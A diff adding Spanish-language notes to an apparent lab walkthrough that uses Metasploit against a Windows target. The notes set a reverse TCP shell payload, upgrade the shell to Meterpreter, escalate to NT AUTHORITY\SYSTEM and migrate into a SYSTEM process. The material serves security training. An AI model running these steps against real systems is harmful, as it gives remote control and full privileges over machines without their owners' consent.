@@ -46,9 +46,62 @@ use 0
 show options
 ```
 
+Tenemos que añadir el host de la víctima:
+```bash
+set RHOSTS IP
+```
+
+Tal y como está configurado ya debería funcionar. Sin embargo el laboratorio nos pide que cambiemos el payload a usar:
+```bash
+set payload windows/x64/shell/reverse_tcp
+```
+
+El exploit aprovecha una vulnerabilidad para entrar al sistema.
+
+El payload es lo que quieres que ocurra una vez que el exploit funciona.
+
+
+Este payload nuevo lo que hace es ejecutar una reverse shell en Windows x64. Una reverse shell es una conexión desde la víctima a mi máquina Kali. Despues ejecutamos el exploit: `exploit`.
+
+Ahora nos piden enviar la shell a segundo plano (Ctrl+Z). Se nos guardará la sesión, podemos verla en:
+```bash
+sessions
+sessions -i 1   # acceder a la sesión
+```
+
 
 ## Escalate 
 
+**Si todavía no lo has hecho, envía la shell obtenida anteriormente a segundo plano (CTRL + Z). Investiga cómo convertir una shell normal en una sesión Meterpreter usando Metasploit. ¿Cuál es el nombre del módulo de post-explotación que vamos a utilizar? (Escribe la ruta exacta, igual que hiciste con el exploit anterior).**
+
+Ya hemos explotado la máquina. Ahora hay que buscar un módulo post, de post-explotación. Buscamos en Metasploit un módulo que transforme de shell a meterpreter:
+```search
+search shell_to_meterpreter
+use 0
+```
+Hay que usar el módulo: `post/multi/manage/shell_to_meterpreter`
+
+
+**Selecciona ese módulo (utiliza MODULE_PATH). Ejecuta `show options`. ¿Qué opción es obligatorio modificar?**
+
+```bash
+run           # vemos que falta el parámetro SESSION
+show options
+```
+
+**Configura la opción necesaria. Puede que tengas que listar todas las sesiones para encontrar la sesión objetivo.**
+
+**Ejecuta el módulo. Si no funciona, vuelve a realizar el exploit del ejercicio anterior e inténtalo de nuevo.**
+
+**Cuando la conversión a Meterpreter termine correctamente, selecciona esa nueva sesión para trabajar con ella.**
+
+**Comprueba que has escalado privilegios a **NT AUTHORITY\SYSTEM**. Ejecuta `getsystem` para confirmarlo. Si quieres, abre una consola de CMD con el comando `shell` y ejecuta `whoami`. Debería devolver que eres **SYSTEM**. Después, envía esa shell a segundo plano y vuelve a seleccionar la sesión de Meterpreter.**
+
+
+**Lista todos los procesos en ejecución con el comando `ps`. Aunque seas **SYSTEM**, eso no significa que el proceso en el que estás ejecutándote también lo sea. Busca, hacia el final de la lista, un proceso que se esté ejecutando como **NT AUTHORITY\SYSTEM** y anota su **PID** (la primera columna de la izquierda).**
+
+
+**Migra a ese proceso utilizando el comando `migrate PROCESS_ID`, sustituyendo `PROCESS_ID` por el PID que acabas de anotar. Puede que tengas que intentarlo varias veces, ya que la migración de procesos no siempre es estable. Si falla, puede que tengas que volver a realizar la conversión a Meterpreter o reiniciar la máquina y empezar de nuevo. Si ocurre, prueba con otro proceso la próxima vez.**
 
 
 
